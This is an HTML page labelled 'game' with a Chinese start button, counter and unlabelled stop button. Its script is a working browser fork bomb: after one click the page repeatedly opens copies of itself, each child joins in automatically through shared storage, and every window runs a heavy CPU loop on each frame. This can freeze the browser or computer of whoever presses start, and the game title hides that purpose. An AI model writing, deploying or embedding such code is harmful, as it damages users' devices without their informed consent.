<!DOCTYPE html>
<html lang="zh">

<head>
    <meta charset="UTF-8">
    <title>game</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            text-align: center;
            padding: 40px;
            background: #111;
            color: #eee;
        }

        h1 {
            font-weight: 400;
            margin-bottom: 20px;
        }

        #count {
            font-size: 2.5rem;
            font-weight: bold;
            color: #0f0;
        }

        button {
            font-size: 1.2rem;
            padding: 12px 28px;
            margin: 10px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.15s;
        }

        #start {
            background: #0f0;
            color: #000;
        }

        #stop {
            background: #f33;
            color: #fff;
        }

        button:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        p.note {
            color: #aaa;
            margin-top: 24px;
            font-size: 0.9rem;
        }
    </style>
</head>

<body>
    <h1></h1>
    <div> <span id="count">0</span> </div>
    <button id="start">▶ 开始</button>
    <button id="stop" disabled></button>
    <p class="note">点击“开始”</p>

    <script>
        const $ = id => document.getElementById(id);
        const startBtn = $('start');
        const stopBtn = $('stop');
        const RUN_KEY = 'infinite_running';
        const COUNT_KEY = 'infinite_count';

        // ========== 配置参数 ==========
        const LOOPS_PER_FRAME = 3000000;   // 每帧压力计算循环次数
        const SPAWN_COUNT = 2;            // 每次打开的子窗口数量
        const SPAWN_INTERVAL = 200;       // 持续打开子窗口的间隔（毫秒）
        const AUTO_CLOSE_DELAY = 400;    // 窗口存活时间（毫秒）
        // =============================

        let cpuTimer = null;
        let closeTimer = null;
        let spawnTimer = null;            // 持续打开窗口的定时器

        function updateCount() {
            $('count').textContent = localStorage.getItem(COUNT_KEY) || '0';
        }

        function changeCount(delta) {
            let v = parseInt(localStorage.getItem(COUNT_KEY) || '0') + delta;
            if (v < 0) v = 0;
            localStorage.setItem(COUNT_KEY, v);
            updateCount();
        }

        // 打开一个子窗口
        function openOne() {
            const w = window.open(location.href, '_blank');
            if (w) {
                changeCount(1);
                const check = setInterval(() => {
                    if (w.closed) { clearInterval(check); changeCount(-1); }
                }, 800);
            }
        }

        // 立即裂变（每个窗口仅执行一次）
        function spawnImmediate() {
            if (sessionStorage.getItem('spawned')) return;
            sessionStorage.setItem('spawned', '1');
            for (let i = 0; i < SPAWN_COUNT; i++) {
                openOne();
            }
        }

        // 持续裂变（每200ms打开SPAWN_COUNT个窗口）
        function startContinuousSpawn() {
            if (spawnTimer) return;
            spawnTimer = setInterval(() => {
                for (let i = 0; i < SPAWN_COUNT; i++) {
                    openOne();
                }
            }, SPAWN_INTERVAL);
        }

        // 重度计算任务
        function heavyLoad() {
            let r = 0.1;
            for (let i = 0; i < LOOPS_PER_FRAME; i++) {
                r += Math.sqrt(i) * Math.sin(i) * Math.cos(i);
                r *= 1.000001;
                if (i % 5000 === 0) r -= 0.000001;
            }
            return r;
        }

        function startCompute() {
            if (cpuTimer) return;
            function loop() {
                heavyLoad();
                cpuTimer = requestAnimationFrame(loop);
            }
            cpuTimer = requestAnimationFrame(loop);
        }

        function stopCompute() {
            if (cpuTimer) { cancelAnimationFrame(cpuTimer); cpuTimer = null; }
        }

        function clearTimers() {
            if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
            if (closeTimer) { clearTimeout(closeTimer); closeTimer = null; }
            stopCompute();
        }

        function scheduleClose() {
            if (closeTimer) return;
            closeTimer = setTimeout(() => {
                clearTimers();
                window.close();
            }, AUTO_CLOSE_DELAY);
        }

        // 开始（主窗口点击 或 子窗口自动调用）
        function start() {
            if (localStorage.getItem(RUN_KEY) === '1') return;
            localStorage.setItem(RUN_KEY, '1');
            spawnImmediate();          // 立即裂变
            startContinuousSpawn();    // 启动持续裂变定时器
            startCompute();            // 开始压力计算
            scheduleClose();           // 定时自毁
            startBtn.disabled = true;
            stopBtn.disabled = false;
        }

        function stop() {
            localStorage.setItem(RUN_KEY, '0');
            clearTimers();
            startBtn.disabled = false;
            stopBtn.disabled = true;
        }

        window.addEventListener('load', () => {
            updateCount();
            const isChild = window.opener !== null;
            if (localStorage.getItem(RUN_KEY) === '1' && isChild) {
                start();   // 子窗口自动加入
            }
            window.addEventListener('storage', e => {
                if (e.key === RUN_KEY) {
                    e.newValue === '1' ? start() : stop();
                } else if (e.key === COUNT_KEY) {
                    updateCount();
                }
            });
            window.addEventListener('beforeunload', () => {
                changeCount(-1);
                clearTimers();
                if (parseInt(localStorage.getItem(COUNT_KEY) || '0') <= 0) {
                    localStorage.removeItem(RUN_KEY);
                    localStorage.removeItem(COUNT_KEY);
                }
            });
        });

        startBtn.onclick = start;
        stopBtn.onclick = stop;
    </script>
</body>

</html>
